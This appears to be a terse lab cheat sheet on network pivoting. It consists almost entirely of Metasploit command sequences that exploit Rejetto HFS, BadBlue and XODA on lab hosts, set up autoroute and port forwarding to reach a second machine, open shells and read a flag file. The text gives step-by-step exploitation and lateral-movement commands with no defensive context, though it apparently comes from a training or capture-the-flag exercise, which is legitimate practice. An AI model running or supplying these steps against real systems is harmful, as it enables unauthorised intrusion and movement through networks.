**Pivoting**
1)
```
Victim Machine 1 : 10.0.18.105
Victim Machine 2 : 10.0.24.43
nmap -sVC 10.0.18.105
msfconsole -q
search hfs
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.18.105
run
shell
ctrl+z
run autoroute -s 10.0.18.0/20  #target 1 ip
run autoroute -p
background
search portscan
use  auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.24.43   #target 2 ip
set ports 1-100
run
sessions
sessions -i 1
portfwd add -l 4545 -p 80 -r 10.0.24.43
nmap -sVC -p 4545 localhost # new terminal
background
search badblue
use  exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp
show options
set RHOSTS 10.0.24.43
set RHOST 10.0.24.43
run
shell
cd C:\
dir
type flag.txt
```
2)
```
ip a s
service postgresql start && msfconsole
db_status
workspace
search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 192.149.33.3
show options
run
curl 192.149.33.3
search xoda
use exploit/unix/webapp/xoda_file_upload
set RHOSTS 192.149.33.3
set  TARGETURI /
show options
run
sysinfo
shell
bin/bash -i
ip a s
ctrl+c
sysinfo
run autoroute -s 192.9.21.2
sessions 
search portscan
use  auxiliary/scanner/portscan/tcp
set RHOSTS 192.149.33.3
show options
run


```




